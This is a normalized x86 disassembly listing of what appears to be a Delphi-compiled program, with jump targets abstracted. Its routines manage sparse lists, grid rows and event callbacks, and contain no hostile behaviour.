or bl 0x1
or bl 0x2
jmp r-xdata
cmp eax [ esp + 0x54 ]
jle r-xdata
or bl 0x4
jmp r-xdata
mov al [ r-xdata ]
cmp al bl
je r-xdata
or bl 0x8
mov edx ebx
mov eax edi
mov si 0xffa6
call sub_403450
sub_476608
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
pop ebx
retn
mov eax ebx
call sub_450adc
test al al
je r-xdata
test [ ebx + 0x1c ] 0x40
jne r-xdata
mov eax ebx
call sub_461dc8
test eax eax
je r-xdata
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_476644
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov ebx eax
lea ecx [ esp + 0x1 ]
mov dl [ esp ]
mov eax ebx
call sub_44a9dc
test al al
jne r-xdata
add esp 0xc
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x24c ]
dec edx
mov eax [ ebx + 0x22c ]
cmp edx eax
jle r-xdata
mov al 0x1
mov edx eax
inc edx
mov eax ebx
call sub_475c64
sub_476690
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov ebx eax
lea ecx [ esp + 0x1 ]
mov dl [ esp ]
mov eax ebx
call sub_44aa28
test al al
jne r-xdata
add esp 0xc
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x22c ]
cmp eax [ ebx + 0x23c ]
jle r-xdata
mov al 0x1
mov edx eax
dec edx
mov eax ebx
call sub_475c64
sub_47675c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_403fa4
cmp [ ebx + 0x2aa ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
push esi
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x2ac ]
call [ ebx + 0x2a8 ]
sub_47679c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_403fa4
cmp [ ebx + 0x2b2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
push eax
push esi
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_4767fc
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
sub_47682c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_476858
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax ebx
mov si 0xffc8
call sub_403450
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov al [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
mov eax ebx
mov si 0xffc8
call sub_403450
test al al
je r-xdata
mov eax ebx
call sub_4499bc
sub eax [ ebp - 0x14 ]
mov [ ebp - 0x14 ] eax
mov eax ebx
call sub_4499bc
mov esi eax
sub esi [ ebp - 0xc ]
mov [ ebp - 0xc ] esi
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0xc ] eax
xor edx edx
mov eax ebx
call sub_472ca0
mov dl 0x1
mov eax ebx
call sub_472ca0
sub_47693c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx [ r-xdata ]
mov eax 0x8
call sub_404d78
mov ebx eax
mov [ ebx ] edi
lea eax [ ebx + 0x4 ]
mov edx esi
call sub_403ff8
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_476b38
push ebx
push esi
push ecx
mov esi ecx
mov ebx edx
mov [ esp ] eax
movzx eax si
mov edx eax
shl edx 0x2
mov eax esp
call sub_402804
movzx edx si
movzx eax [ ebx ]
sub edx eax
shl edx 0x2
mov ecx [ esp ]
lea eax [ ecx + eax * 4 ]
xor ecx ecx
call sub_402c68
mov [ ebx ] si
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_476b74
push ebx
push esi
push edi
mov esi edx
shl esi 0x2
movzx edi si
mov eax edi
call sub_4027c4
mov ebx eax
mov edx edi
mov eax ebx
xor ecx ecx
call sub_402c68
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_476b9c
push ebx
push esi
test dl dl
je r-xdata
xor ebx ebx
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] 0x0
mov [ eax + 0x10 ] 0xffffffff
xor ebx ebx
mov bl cl
movzx esi [ ebx + rw-data ]
inc esi
mov [ eax + 0x14 ] si
movzx esi [ ebx + rw-data ]
mov [ eax + 0xa ] si
xor ecx ecx
mov cl [ ebx + rw-data ]
mov [ eax + 0xc ] cx
mov [ eax + 0x18 ] 0xffffffff
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_403578
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_476c00
push ebx
push esi
push edi
push ebp
call sub_4035e0
mov ebx edx
mov esi eax
xor ebp ebp
mov di [ esi + 0x14 ]
shl edi 0x2
jmp r-xdata
movzx eax [ esi + 0x8 ]
cmp ebp eax
jl r-xdata
mov eax [ esi + 0x4 ]
mov eax [ eax + ebp * 4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
inc ebp
movzx edx di
call sub_4027e4
test bl bl
jle r-xdata
movzx edx [ esi + 0x8 ]
shl edx 0x2
call sub_4027e4
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_476c58
push ebx
cmp edx [ eax + 0x18 ]
jne r-xdata
mov cx [ eax + 0xc ]
mov ebx edx
shr ebx cl
mov ecx ebx
movzx ebx [ eax + 0x8 ]
cmp ecx ebx
jb r-xdata
mov ecx [ eax + 0x1c ]
jmp r-xdata
mov ebx [ eax + 0x4 ]
mov ecx [ ebx + ecx * 4 ]
test ecx ecx
je r-xdata
xor ecx ecx
jmp r-xdata
mov eax ecx
pop ebx
retn
test ecx ecx
jne r-xdata
movzx ebx [ eax + 0xa ]
and ebx edx
shl ebx 0x2
add ecx ebx
mov ecx [ ecx ]
xor ecx ecx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov [ eax + 0x1c ] ecx
sub_476ca4
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov cx [ ebx + 0xc ]
mov esi edi
shr esi cl
cmp si [ ebx + 0x8 ]
jb r-xdata
mov ebp [ ebx + 0x4 ]
lea ecx [ esi + 0x1 ]
lea edx [ ebx + 0x8 ]
mov eax [ ebx + 0x4 ]
call sub_476b38
mov ebp eax
jmp r-xdata
movzx edx [ ebx + 0xa ]
and edx edi
shl edx 0x2
add eax edx
cmp edi [ ebx + 0x10 ]
jle r-xdata
movzx eax si
mov dx [ ebx + 0x14 ]
call sub_476b74
movzx edx si
mov [ ebp + edx * 4 ] eax
mov [ ebx + 0x4 ] ebp
movzx eax si
mov eax [ ebp + eax * 4 ]
test eax eax
jne r-xdata
mov [ ebx + 0x18 ] 0xffffffff
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x10 ] edi
sub_476d10
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_476ca4
mov [ eax ] esi
test esi esi
jne r-xdata
mov edx edi
mov eax ebx
call sub_476c58
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_476df8
sub_476d44
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x10 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
movzx eax [ esi + 0x8 ]
cmp eax [ ebp - 0x18 ]
jbe r-xdata
mov eax [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x18 ]
mov ebx [ eax + edx * 4 ]
test ebx ebx
je r-xdata
inc [ ebp - 0x18 ]
xor edi edi
mov cx [ esi + 0xc ]
mov eax [ ebp - 0x18 ]
shl eax cl
mov [ ebp - 0x8 ] eax
jmp r-xdata
movzx eax [ esi + 0x14 ]
cmp edi eax
jge r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
add ebx 0x4
inc edi
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
push [ ebp - 0x4 ]
call [ ebp - 0x10 ]
pop ecx
mov [ ebp - 0x14 ] eax
sub_476dd0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
cmp eax [ ecx + 0x10 ]
jle r-xdata
xor ecx ecx
test edx edx
je r-xdata
mov ecx 0x1
jmp r-xdata
mov eax ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
sub_476df8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] 0xffffffff
mov edx sub_476dd0
mov eax [ ebp - 0x4 ]
call sub_476d44
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x10 ] edx
pop ecx
pop ecx
pop ebp
retn
sub_476e24
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx ecx
mov eax esi
call sub_47707c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_476e5c
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov dl 0x1
mov ecx [ eax ]
call [ ecx - 0x4 ]
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_476e84
push ebx
mov ebx eax
mov dl 0x1
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov dl [ ebx + 0xc ]
mov eax ebx
call sub_47707c
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
sub_476ea4
push ebx
push esi
push edi
push ebp
mov ebx eax
test edx edx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edx [ ebx + 0x8 ]
jge r-xdata
mov esi edx
mov edi [ ebx + 0x8 ]
dec edi
sub edi esi
jl r-xdata
xor ecx ecx
mov edx [ ebx + 0x8 ]
mov eax [ ebx + 0x4 ]
call sub_476d10
dec [ ebx + 0x8 ]
inc edi
lea edx [ esi + 0x1 ]
mov ebp [ ebx + 0x4 ]
mov eax ebp
call sub_476c58
mov ecx eax
mov edx esi
mov eax ebp
call sub_476d10
inc esi
dec edi
jne r-xdata
sub_476ef0
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_476f38
mov ebp eax
mov edx edi
mov eax ebx
call sub_476f38
mov ecx eax
mov edx esi
mov eax ebx
call sub_47709c
mov ecx ebp
mov edx edi
mov eax ebx
call sub_47709c
pop ebp
pop edi
pop esi
pop ebx
retn
sub_476f38
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_476f93
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jge r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_476c58
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_476f9a
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov edx [ ebp - 0x4 ]
mov ecx ebx
mov eax [ r-xdata ]
call sub_41a524
sub_476fa4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_477038
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
jge r-xdata
mov ebx [ esi + 0x8 ]
cmp edi ebx
jge r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405ecc
mov edx [ ebp - 0x8 ]
mov ecx edi
mov eax [ r-xdata ]
call sub_41a524
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4 ]
call sub_476d10
cmp edi [ esi + 0x8 ]
jle r-xdata
mov edx ebx
dec edx
mov eax [ esi + 0x4 ]
call sub_476c58
mov ecx eax
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_476d10
dec ebx
cmp edi ebx
jl r-xdata
inc [ esi + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47703f
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
mov [ esi + 0x8 ] edi
sub_477048
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_476f38
mov ebp eax
mov edx esi
mov eax ebx
call sub_476ea4
mov ecx ebp
mov edx edi
mov eax ebx
call sub_476fa4
sub_47707c
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0xc ] bl
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_476b9c
mov [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_47709c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_477104
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jge r-xdata
mov ecx edi
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_476d10
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
inc eax
mov [ ebx + 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47710b
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov edx [ ebp - 0x4 ]
mov ecx esi
mov eax [ r-xdata ]
call sub_41a524
sub_477114
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov esi eax
xor edx edx
mov eax esi
call sub_403224
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_476e24
mov [ esi + 0x10 ] eax
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_477168
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
test bl bl
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ esi + 0x10 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx - 0x4 ]
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_477198
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_477203
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41e3a4
mov esi eax
test esi esi
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47720a
lea eax [ ebp - 0x8 ]
call sub_403fa4
retn
push 0x0
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_41f0f4
mov eax [ ebp - 0x8 ]
push eax
mov eax ebx
call sub_41e3a4
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x64 ]
dec esi
test esi esi
jg r-xdata
sub_477224
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
xchg edx eax
call sub_41fc2c
mov edx [ ebx + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_41fd48
xor eax eax
pop ebx
pop ebp
retn
sub_47724c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov edx sub_477214
mov eax [ ebx + 0x10 ]
call sub_476f2c
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41fc2c
mov edx sub_477224
mov eax [ ebx + 0x10 ]
call sub_476f2c
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4772b5
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_476f38
mov ebx eax
test ebx ebx
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_403ff8
mov eax esi
call sub_403fa4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4772f0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_476f38
test eax eax
jne r-xdata
mov eax [ eax ]
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_477310
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov ebp edx
mov ebx eax
mov edx ebp
mov eax [ ebx + 0x10 ]
call sub_476f38
mov esi eax
test esi esi
jne r-xdata
mov edi [ esi ]
xor edi edi
jmp r-xdata
mov edx edi
mov eax [ esp ]
call sub_47693c
mov ecx eax
mov edx ebp
mov eax [ ebx + 0x10 ]
call sub_47709c
test edi edi
jne r-xdata
cmp [ esp ] 0x0
jne r-xdata
mov eax ebx
call sub_4773b8
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_476968
xor ecx ecx
mov edx ebp
mov eax [ ebx + 0x10 ]
call sub_47709c
jmp r-xdata
test esi esi
je r-xdata
sub_477378
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_476f38
test eax eax
je r-xdata
test esi esi
je r-xdata
mov [ eax ] esi
jmp r-xdata
mov eax ebx
call sub_4773b8
pop edi
pop esi
pop ebx
retn
mov edx esi
xor eax eax
call sub_47693c
mov ecx eax
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_47709c
sub_4773cc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_476f38
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_476ea4
mov eax ebx
call sub_4773b8
pop esi
pop ebx
retn
call sub_476968
sub_477408
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor edx edx
mov eax edi
call sub_47693c
mov ecx eax
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_476fa4
mov eax ebx
call sub_4773b8
pop edi
pop esi
pop ebx
retn
sub_477464
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403224
mov [ edi + 0x10 ] esi
mov eax [ ebp + 0x8 ]
mov [ edi + 0x14 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_4774ac
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_477594
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_41afdc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47759b
lea eax [ ebp - 0xc ]
call sub_403fa4
retn
mov eax [ ebp - 0x4 ]
call sub_41b074
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jl r-xdata
xor eax eax
push ebp
push sub_47756d
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41b130
retn
inc ebx
mov [ ebp - 0x8 ] ebx
xor ebx ebx
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x20 ]
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x24 ]
inc ebx
dec [ ebp - 0x8 ]
jne r-xdata
sub_4775a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jne r-xdata
test ebx ebx
jle r-xdata
mov [ ecx ] 0xffffffff
mov [ edx ] 0xffffffff
jmp r-xdata
neg ebx
dec ebx
mov [ ecx ] ebx
mov eax [ ebp - 0x4 ]
mov [ edx ] eax
mov esi [ ebp - 0x4 ]
mov [ ecx ] esi
dec ebx
mov [ edx ] ebx
jmp r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4775e4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47766e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
or ebx 0xffffffff
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
jmp r-xdata
mov ecx r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477675
lea eax [ ebp - 0xc ]
call sub_403fa4
retn
sub_477683
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx ebx
mov esi [ eax ]
call [ esi + 0x24 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor ecx ecx
mov edx ebx
mov ebx [ eax ]
call [ ebx + 0x20 ]
xor eax eax
pop esi
pop ebx
pop ebp
retn
sub_4776b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jle r-xdata
test ebx ebx
jge r-xdata
mov edx ebx
dec edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x2d8 ]
call sub_476f38
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx r-xdata
mov eax [ eax + 0x10 ]
call sub_476f2c
jmp r-xdata
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x24 ]
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_47772c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_47776a
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov eax [ ebp - 0x4 ]
call sub_470308
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477771
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_477774
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_4775a4
cmp [ esp ] 0x0
jge r-xdata
push esi
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_477d88
mov eax esi
call sub_403fa4
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4777b4
mov edx [ eax + 0x14 ]
test edx edx
jne r-xdata
test edx edx
jle r-xdata
xor eax eax
retn
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x24c ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x21c ]
jmp r-xdata
retn
sub_4777d8
push ebx
add esp 0xfffffff8
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_4775a4
cmp [ esp ] 0x0
jge r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax [ ebx + 0x10 ]
call sub_477dcc
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop ebx
retn
sub_47780c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_47784b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ecc
mov eax [ ebp - 0x4 ]
call sub_470308
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_477852
lea eax [ ebp - 0x4 ]
call sub_403fa4
retn
sub_477858
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_4775a4
push esi
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_477df8
pop ecx
pop edx
pop esi
pop ebx
retn
sub_477888
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx eax
lea eax [ esp + 0x4 ]
push eax
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_4775a4
push esi
mov ecx [ esp + 0x8 ]
mov edx [ esp + 0x4 ]
mov eax [ ebx + 0x10 ]
call sub_477e48
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4778c4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_47114c
mov eax esi
call sub_477bd8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax esi
pop esi
pop ebx
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_47790c
push ebx
push esi
call sub_4035e0
mov ebx edx
